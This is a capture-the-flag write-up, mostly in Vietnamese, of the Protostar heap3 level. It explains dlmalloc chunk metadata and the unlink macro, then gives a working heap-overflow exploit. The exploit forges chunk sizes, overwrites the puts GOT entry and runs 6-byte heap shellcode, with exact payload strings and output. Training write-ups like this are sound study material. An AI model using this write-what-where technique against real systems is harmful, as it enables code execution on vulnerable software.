# **heap3**
## Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

- The despcription at the top of this level is:
```
This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.
```
- The goal is to call the winner() function. As strcpy() is used, it is possible to heap overflow.

## Heap chunk
Vùng nhớ được tạo bởi malloc() sẽ trông như dưới đây, gọi là chunk. Trong đó:
- 4 bytes prev_size: nếu previous chunk free, prev_size là kích thước của chunk đó.
- 4 bytes size: kích trước của chunk này. Trong đó the lowest bit of size called PREV_INUSE indicates whether the previous chunk is used or not.
- data: địa chỉ của vùng này được trả về cho người dùng.

```
.            +----------------------------------+
    chunk -> | 4 bytes: prev_size               |
             +----------------------------------+
             | 4 bytes: size                    |
             +----------------------------------+
      mem -> | data                             |
             : ...                              :
             +----------------------------------+
nextchunk -> | prev_size ...                    |
             :                                  :
```
Các chunk được free được tổ chức dưới dạng double linked list.\
Khi chunk được free, 8 bytes đầu của vùng data được dùng để chứa fd (địa chỉ node tiếp theo) và bk (địa chỉ node trước).
```
.            +----------------------------------+
    chunk -> | 4 bytes: prev_size               |
             +----------------------------------+
             | 4 bytes: size                    |
             +----------------------------------+
      mem -> | 4 bytes: fd                      |
             +----------------------------------+
             | 4 bytes: bk                      |
             +----------------------------------+
             | (old memory, can be zero bytes)  |
             :                                  :

nextchunk -> | prev_size ...                    |
             :                                  :
```
## free()
Đoạn code quan trọng trong hàm free - dlmalloc 2002
```
    else if (!chunk_is_mmapped(p)) {
      set_anychunks(av);

      nextchunk = chunk_at_offset(p, size);
      nextsize = chunksize(nextchunk);

      /* consolidate backward */
      if (!prev_inuse(p)) {
        prevsize = p->prev_size;
        size += prevsize;
        p = chunk_at_offset(p, -((long) prevsize));
        unlink(p, bck, fwd);
      }

      if (nextchunk != av->top) {
        /* get and clear inuse bit */
        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
        set_head(nextchunk, nextsize);

        /* consolidate forward */
        if (!nextinuse) {
          unlink(nextchunk, bck, fwd);
          size += nextsize;
        }

        /*
          Place the chunk in unsorted chunk list. Chunks are
          not placed into regular bins until after they have
          been given one chance to be used in malloc.
        */

        bck = unsorted_chunks(av);
        fwd = bck->fd;
        p->bk = bck;
        p->fd = fwd;
        bck->fd = p;
        fwd->bk = p;

        set_head(p, size | PREV_INUSE);
        set_foot(p, size);
        
        check_free_chunk(p);
      }
```
Ta có thể hiểu như sau, khi hàm free(current_chunk) được gọi:
- Chuyển current_chunk thành free chunk
- Kiểm tra previous chunk và next chunk xem có cái nào free không.
- Nếu 2 chunk này không free, thêm luôn current_chunk vào double linkedlist.
- Nếu previous chunk là free chunk, unlink previous chunk, gộp với current_chunk, add chunk mới được tạo thành vào double linked list. (consolidate backward)
- Nếu next chunk là free chunk, unlink next chunk, gộp với current_chunk, add chunk mới được tạo thành vào double linked list. (consolidate forward)

Địa chỉ previous chunk được tính bằng địa chỉ của current chunk trừ đi prev_size\
Địa chỉ next chunk được tính bằng địa chỉ của current chunk cộng với size\
Kiểm tra previous chunk là free hay không bằng cách kiểm tra bit cuối ô size của current chunk\
Kiểm tra next chunk là free hay không bằng cách kiểm tra bit cuối ô size của "chunk tiếp theo chunk tiếp theo".
## unlink
unlink macro defined as:
```
#define unlink(P, BK, FD) {
  BK = P->bk;
  FD = P->fd;
  FD->bk = BK;
  BK->fd = FD;
}
```
Trong đó, p là struct malloc_chunk
```
struct malloc_chunk {  
  INTERNAL_SIZE_T      prev_size;   //4 bytes
  INTERNAL_SIZE_T      size;        //4 bytes

  struct malloc_chunk* fd;          //4 bytes
  struct malloc_chunk* bk;          //4 bytes
};
```
=> unlink macro viết dưới dạng con trỏ (Written with pointer notation:):
```
BK = *(P + 12)
FD = *(P + 8)
*(FD + 12) = BK
*(BK + 8) = FD
```
Do ta có thể sử dụng heap overflow để ghi đè lên metadata của chunk, do đó ta có thể lợi dụng unlink macro để ghi giá trị bất kì lên ô nhớ bất kì.

## PLT GOT
Khi chương trình liên kết thư viện động, địa chỉ của các hàm trong thư viện sẽ được lưu trong một bảng gọi là GOT. Nếu thay đổi được giá trị trong bảng GOT, ta có thể thay đổi được luồng chạy của chương trình khi chương trình gọi đến các hàm này.

## exploit
- Theo source code, ta có 3 chunk gọi là a, b, c.
- Dùng strcpy vào b để overflow, chỉnh sửa metadata của c.
- Ta cần lừa hàm free() để kích hoạt unlink macro, tuy nhiên nếu ta unlink chunk mà fd và bk của chunk đó trỏ đến địa chỉ không hợp lệ (vùng không được ghi) sẽ dẫn đến lỗi => không unlink bừa bãi.
- Khi free(c), chọn consolidate backward, không để consolidate forward.

- Để consolidate backward, bit cuối của size trong c phải = 0.
- Để không consolidate forward, bit cuối của size của (next chunk của next chunk) phải = 1
- Chỉnh sửa prev_size và size trong c để lừa free tính sai địa chỉ của previous chunk và next chunk.

**Vấn đề 1: attack-string không thể chứa \x00 - NUL**

Nếu ta muốn chỉnh sửa prev_size hoặc size thành số có dạng 0x000000**, trong attack-string phải có \x00, mà strcpy coi \x00 là kí tự kết thúc string => fail.\
Để né NUL, số bé nhất là 0x01010101, nếu dùng số này thì free() sẽ tính ra địa chỉ của previous chunk hoặc next chunk ở quá xa, không thể chỉnh sửa giá trị ở đó, hoặc là ra một địa chỉ không hợp lệ.\
Solution: Sử dụng một số thật lớn, ví dụ: 0xfffffffc. 
- Khi cộng số này với một số khác sẽ xảy ra hiện tượng tràn bit, tương đương với việc coi 0xfffffffc là -4, một số âm nhỏ. Một số âm nhỏ khiến free() tính ra địa chỉ của previous chunk và next chunk ở gần current chunk => dễ dàng chỉnh sửa.
- Bit cuối của 0xfffffffc là 0, nếu để size = 0xfffffffc => consolidate backward.
- Sử dụng một số lớn như 0xfffffffc để ghi vào size hoặc prev_size sẽ tránh được trường hợp dlmalloc coi chunk là chunk bé, dẫn đến không kích hoạt được phần code consolidate (0xfffffffc > 64)

**Kết thúc vấn đề 1: sử dụng 0xfffffffc**
- Ta sẽ chỉnh sửa prev_size của c thành -4, size của c thành -4:
```
                                      c chunk
                                      ↓
--------------------------------------+------------+------------+--------------------------------+
                                      |prev_size:  |size:       |                                |
                                      |-4          |-4          |                                |
--------------------------------------+------------+------------+--------------------------------+
```
- Khi đó, previous chunk sẽ là: current chunk -(prev_size):
```
                                      c chunk
                                      ↓
--------------------------------------+------------+------------+--------------------------------+
                                      |prev_size:  |size:       |                                |
                                      |-4          |-4          |                                |
--------------------------------------+------------+------------+--------------------------------+
                                                   ↑
                                                   previous chunk
```
- next chunk sẽ là: current chunk +(size):
```
                                      c chunk
                                      ↓
-------------------------+------------+------------+------------+--------------------------------+
                         |            |prev_size:  |size:       |                                |
                         |            |-4          |-4          |                                |
-------------------------+------------+------------+------------+--------------------------------+
                         ↑
                         next chunk
```
- next chunk của next chunk sẽ là: next chunk +(size), size của next chunk chính là ô prev_size của c chunk, là -4:
```
                                      c chunk
                                      ↓
------------+------------+------------+------------+------------+--------------------------------+
            |            |            |prev_size:  |size:       |                                |
            |            |            |-4          |-4          |                                |
------------+------------+------------+------------+------------+--------------------------------+
            ↑            ↑
            next         next chunk
            next
            chunk
```
- Để không consolidate forward (unlink next chunk), ta phải để bit cuối ô size của next next chunk là 1:
```
                                      c chunk
                                      ↓
------------+------------+------------+------------+------------+--------------------------------+
            |            |bit cuối    |prev_size:  |size:       |                                |
            |            |ô này: 1    |-4          |-4          |                                |
------------+------------+------------+------------+------------+--------------------------------+
            ↑            ↑
            next         next chunk
            next
            chunk
```
- Quay trở lại với previous chunk, gọi cách khác chính là fake chunk, ta cần chỉnh sửa fd và bk của chunk này để chỉnh sửa bảng GOT hàm puts thành địa chỉ hàm winner():
- Tìm địa chỉ hàm winner():
```
(gdb) print winner
$1 = {void (void)} 0x8048864 <winner>
```
- GOT puts address:
```
(gdb) disas main
...
0x08048935 <main+172>:  call   0x8048790 <puts@plt>
...
(gdb) x/3i 0x08048790
0x8048790 <puts@plt>:   jmp    DWORD PTR ds:0x804b128
0x8048796 <puts@plt+6>: push   0x68
0x804879b <puts@plt+11>:        jmp    0x80486b0
```
=> GOT puts address = 0x0804b128
- Dựa vào unlink macro, =>:
  - fd = GOT puts address - 12
  - bk = winner address

**Vấn đề 2: unlink macro**

Trong unlink macro có:
```
*(FD + 12) = BK  (1)
*(BK + 8) = FD   (2)
```
Nếu ta để GOT address vào FD, winner address vào BK, dòng (1) sẽ thực hiện đúng mục đích của ta, tuy nhiên dòng (2) lại có vấn đề.\
Dòng (2) sẽ ghi GOT address vào vùng code hàm winner, vùng text. dẫn đến fail.

Solution: Viết shell code để trong heap, thay vì ghi winner address vào BK, ta ghi địa chỉ của shell code này vào BK.
- Ta có quyền ghi vào vùng heap, không bị fail như ghi vào vùng text.
- Shell code phải ngắn, < 8 bytes, vì *(địa chỉ shell code + 8) = FD, nghĩa là bị ghi đè.

**Kết thúc vấn đề 2: viết shell code**
- assembly code: push địa chỉ winner() vào stack, ret sẽ gọi hàm winner()
```
  push 0x8048864
  ret
```
- sử dụng trang https://defuse.ca/online-x86-assembler.htm#disassembly, ta có được shell code 6 bytes:
```
\x68\x64\x88\x04\x08\xC3
```
- Ta để shell code vào a.

## FINAL
- Tổng kết lại, heap của ta sẽ như sau:
```
a chunk                                    b chunk                                c chunk
↓                                          ↓                                      ↓   
+----+--------------+----------------------++----+-------------------+------------++-----------+----------+----------+-------------------+-------------------+
|meta| 8 bytes "A"  | 6 bytes shell code   ||meta| 28 bytes "A"      |bit cuối: 1 ||prev_size: |size:     | 4 bytes  | fd of fake chunk: | bk of fake chunk: |
|data|              |                      ||data|                   |            ||-4         |-4        | "A"      | 0x0804b11c        | 0x0804c010        |
+----+--------------+----------------------++----+-------------------+------------++-----------+----------+----------+-------------------+-------------------+
                                                                                               ↑
                                                                                               fake chunk
```
- a: python -c 'print "A"*8 + "\x68\x64\x88\x04\x08\xC3"'
  - "A"*8: 8 bytes này khi free(a) sẽ bị ghi đè. => để tránh shell code bị ghi đè
  - 6 bytes shell code
- b: python -c 'print "A"*28 + "\x01\x01\x01\x01" + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"'
  - "A"*28: trash
  - "\x01\x01\x01\x01": ô này là ô size của next next chunk, để bit cuối là 1 sẽ không consolidate forward
  - "\xfc\xff\xff\xff": -4 thứ nhất, ghi lên prev_size của c chunk
  - "\xfc\xff\xff\xff": -4 thứ 2, ghi lên size của c chunk
- c: python -c 'print "A"*4 + "\x1c\xb1\x04\x08" + "\x10\xc0\x04\x08"'
  - "A"*4: size của fake chunk, không quan trọng, ghi bừa.
  - "\x1c\xb1\x04\x08": GOT puts address - 12 = 0x0804b11c
  - "\x10\xc0\x04\x08": địa chỉ của 6 bytes shell code trong heap

- Result:
```
user@protostar:/opt/protostar/bin$ ./heap3 `python -c 'print "A"*8 + "\x68\x64\x88\x04\x08\xC3"'` `python -c 'print "A"*28 + "\x01\x01\x01\x01" + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"'` `python -c 'print "A"*4 + "\x1c\xb1\x04\x08" + "\x10\xc0\x04\x08"'`
that wasn't too bad now, was it? @ 1654478276
```
- Một cách khác khi thay prev_size = -8, size = -8 của c chunk metadata:
```
user@protostar:/opt/protostar/bin$ ./heap3 `python -c 'print "A"*8 + "\x68\x64\x88\x04\x08\xC3"'` `python -c 'print "A"*24 + "\x01\x01\x01\x01" + "\xfc\xff\xff\xff" + "\xf8\xff\xff\xff" + "\xf8\xff\xff\xff"'` `python -c 'print "A"*8 + "\x1c\xb1\x04\x08" + "\x10\xc0\x04\x08"'`
that wasn't too bad now, was it? @ 1654478410
```
# References
- disassembly online: https://defuse.ca/online-x86-assembler.htm#disassembly
- dlmalloc 2002 source code: https://github.com/ennorehling/dlmalloc/blob/master/malloc.c
- write-up: 
  - https://airman604.medium.com/protostar-heap-3-walkthrough-56d9334bcd13
  - https://secinject.wordpress.com/2018/01/18/protostar-heap3/
https://cw.fel.cvut.cz/old/_media/courses/a4m33pal/04_dynamic_memory_v6.pdf